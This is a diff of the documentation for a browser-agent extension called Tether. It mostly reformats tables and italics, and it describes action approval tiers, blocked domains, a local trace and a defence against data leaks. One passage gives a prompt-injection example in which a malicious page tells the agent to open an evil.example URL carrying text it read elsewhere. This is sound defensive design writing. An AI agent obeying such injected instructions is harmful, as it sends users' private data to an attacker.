@@ -11,11 +11,11 @@ do.
 
 Every action is classified **before** it runs (`src/agent/tiers.ts`):
 
-| Tier | Actions | What happens |
-|---|---|---|
-| **Read** | read the page, scroll, extract data, wait for content, hover | Runs automatically. |
-| **Navigate** | open URLs, back/forward/reload, open/switch/close tabs, follow links, ordinary buttons | Runs automatically, inside the domain policy (§2). |
-| **Write** | type, select, tick a checkbox, set a value, press a key | Runs automatically, except in credential fields (§3). |
+| Tier             | Actions                                                                                                                                                                                                                                                                                                         | What happens                                                                                                                                                        |
+| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Read**         | read the page, scroll, extract data, wait for content, hover                                                                                                                                                                                                                                                    | Runs automatically.                                                                                                                                                 |
+| **Navigate**     | open URLs, back/forward/reload, open/switch/close tabs, follow links, ordinary buttons                                                                                                                                                                                                                          | Runs automatically, inside the domain policy (§2).                                                                                                                  |
+| **Write**        | type, select, tick a checkbox, set a value, press a key                                                                                                                                                                                                                                                         | Runs automatically, except in credential fields (§3).                                                                                                               |
 | **Irreversible** | submitting a form (submit buttons, "type and submit", Enter in a form field); buttons named buy, purchase, pay, place order, delete, remove account/user/member, send, submit, confirm, transfer, (un)subscribe, post, publish, reply, donate, book, reserve, sign up/out, deactivate, close account; downloads | **Stops and asks you.** The panel shows the exact element, its label and context, and the page. Nothing happens until you choose **Allow once** or **Don't allow**. |
 
 Approval is per action. Allowing one "Place order" doesn't allow the next.
@@ -34,14 +34,14 @@ Navigation (`src/agent/guard.ts`) is limited to `http(s)` pages. These are
 - government sites (`.gov`, `.mil`, `gov.uk`, `gc.ca`, `gouv.fr` …)
 - webmail (Gmail, Outlook, Yahoo, Proton…)
 
-You can allow a specific site under *Settings → Agent → Always allow*. The
-settings page warns when you allow a default-blocked one. Your *Never visit*
+You can allow a specific site under _Settings → Agent → Always allow_. The
+settings page warns when you allow a default-blocked one. Your _Never visit_
 list always wins.
 
 **Navigation can leak data.** A malicious page might tell the agent to open
 `https://evil.example/?d=<text it read elsewhere>`. Before any navigation,
 Tether checks whether the URL's path or query carries a run of text the
-agent saw in the task or on pages from *other* sites. If it does, the
+agent saw in the task or on pages from _other_ sites. If it does, the
 navigation is refused.
 
 ## 3. What the agent never does
@@ -89,13 +89,13 @@ navigation is refused.
 Every step goes to a local trace: action, element, page, outcome, and a
 hash of the page before and after (showing whether anything changed). Card
 numbers, SSN-like numbers and token-like strings are redacted first. You can
-review and export it under *Settings → Agent runs*. Nothing leaves your
+review and export it under _Settings → Agent runs_. Nothing leaves your
 machine.
 
 ## 7. Trusted input (optional)
 
 By default the agent acts through scripted DOM events. Some sites only
-accept "trusted" events, so *Settings → Agent* can switch to the **debugger**
+accept "trusted" events, so _Settings → Agent_ can switch to the **debugger**
 backend, which sends real input through Chrome's DevTools protocol. It needs
 the optional `debugger` permission. While it's in use, Chrome shows its own
 "started debugging this browser" bar, and cancelling that bar also stops
